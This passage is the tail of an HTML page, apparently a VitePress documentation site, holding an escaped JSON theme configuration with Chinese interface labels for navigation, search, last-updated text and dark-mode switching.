ShanYi-Hui\"},\"docFooter\":{\"prev\":\"上一页\",\"next\":\"下一页\"},\"outline\":{\"label\":\"页面导航\"},\"lastUpdated\":{\"text\":\"最后更新于\",\"formatOptions\":{\"dateStyle\":\"short\",\"timeStyle\":\"medium\"}},\"search\":{\"provider\":\"local\",\"options\":{\"translations\":{\"button\":{\"buttonText\":\"搜索文档\",\"buttonAriaLabel\":\"搜索文档\"},\"modal\":{\"noResultsText\":\"无法找到相关结果\",\"resetButtonTitle\":\"清除查询条件\",\"footer\":{\"selectText\":\"选择\",\"navigateText\":\"切换\",\"closeText\":\"关闭\"}}}}},\"returnToTopLabel\":\"回到顶部\",\"sidebarMenuLabel\":\"菜单\",\"darkModeSwitchLabel\":\"主题\",\"lightModeSwitchTitle\":\"切换到浅色模式\",\"darkModeSwitchTitle\":\"切换到深色模式\"},\"locales\":{},\"scrollOffset\":134,\"cleanUrls\":false}");</script>
    
  </body>
</html>